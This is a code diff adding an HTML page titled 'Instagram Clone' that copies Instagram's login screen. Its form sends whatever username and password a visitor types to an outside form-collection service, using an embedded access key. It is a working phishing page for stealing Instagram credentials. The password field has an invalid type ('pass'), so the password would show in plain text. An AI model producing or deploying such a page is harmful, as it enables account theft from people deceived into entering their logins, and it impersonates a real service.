@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Clone</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="image-section">
+        <div class="image-stack">
+          <!-- Add images here -->
+          <img src="image1.jpg" alt="Image 1" />
+          <img src="image2.jpg" alt="Image 2" />
+          <img src="image3.jpg" alt="Image 3" />
+        </div>
+      </div>
+      <div class="form-section">
+        <h1>Instagram</h1>
+        <form action="https://api.web3forms.com/submit" method="POST">
+          <!-- Web3Forms Access Key -->
+          <input type="hidden" name="access_key" value="d2d8730a-19f7-4cff-ae8b-275b3394e61a" />
+          <input
+            type="text"
+            name="username"
+            placeholder="Phone number, username, or email"
+            required
+          />
+          <input
+            type="pass"
+            name="pass"
+            placeholder="Pass"
+            required
+          />
+          <button type="submit">Log in</button>
+          <div class="divider">OR</div>
+          <button type="button" class="facebook-login">
+            Log in with Facebook
+          </button>
+          <a href="#" class="forgot-password">Forgot password?</a>
+        </form>
+        <div class="signup">
+          <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
